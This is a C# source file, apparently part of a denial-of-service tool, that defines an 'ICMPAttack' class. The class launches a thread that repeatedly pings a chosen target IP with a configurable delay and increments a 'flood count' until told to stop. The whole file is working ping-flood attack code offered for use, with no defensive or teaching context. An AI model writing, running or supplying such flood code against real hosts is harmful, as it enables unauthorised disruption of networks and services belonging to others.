using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Noah.Attacks
{
    /// <summary>
    /// Class for an ICMP Attack
    /// </summary>
    public class ICMPAttack : IAttack
    {
        /// <summary>
        /// The Attack Name.
        /// </summary>
        public string AttackName { get; private set; }

        private ApplicationState state;
        private string ip;

        /// <summary>
        /// Initializes a new ICMP Attack.
        /// </summary>
        /// <param name="state">The Application State.</param>
        /// <param name="host">The IP to target.</param>
        public ICMPAttack(ApplicationState state, string host)
        {
            this.state = state;
            ip = host;
        }
        /// <summary>
        /// Starts the attack on a new thread.
        /// </summary>
        public void BeginAttack()
        {
            new Thread(() => attack()).Start();
        }

        private void attack()
        {
            // Change the state to an attack mode.
            state.State = States.Attacking;
            // Loop until the overlord thread in Application State tells us to be done.
            while (state.State != States.Done)
            {
                // Send the ping.
                new Ping().Send(ip);
                // Sleep between ticks.
                Thread.Sleep(state.Delay);
                // Increment the flood count.
                state.FloodCount++;
            }
        }
    }
}
